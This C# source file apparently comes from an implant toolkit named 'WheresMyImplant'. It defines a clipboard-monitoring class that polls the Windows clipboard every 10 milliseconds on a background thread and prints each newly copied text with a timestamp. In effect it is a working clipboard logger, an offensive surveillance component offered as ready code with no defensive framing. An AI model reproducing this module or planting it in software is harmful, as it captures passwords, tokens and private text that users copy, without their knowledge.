using System;
using System.Threading;
using System.Windows;

namespace WheresMyImplant
{
    class ClipboardManaged : Base
    {
        private Thread thread;
        private ManualResetEvent exitEvent = new ManualResetEvent(false);
        private static Boolean run = true;


        internal ClipboardManaged()
        {
            Console.CancelKeyPress += (sender, eventArgs) => {
                eventArgs.Cancel = true;
                exitEvent.Set();
            };
        }

        internal void Execute()
        {
            thread = new Thread(() => Monitor());
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
            exitEvent.WaitOne();
            run = false;
            thread.Join(10);
        }

        [STAThread]
        internal static void Monitor()
        {
            String hold = String.Empty;
            while (run)
            {
                if (Clipboard.ContainsText())
                {
                    String text = Clipboard.GetText();
                    if (hold != text)
                    {
                        Console.WriteLine("{0}\t{1}", DateTime.Now.ToString("h:mm:ss tt"), text);
                        hold = text;
                    }
                }
                Thread.Sleep(10);
            }
        }

        ~ClipboardManaged()
        {

        }
    }
}
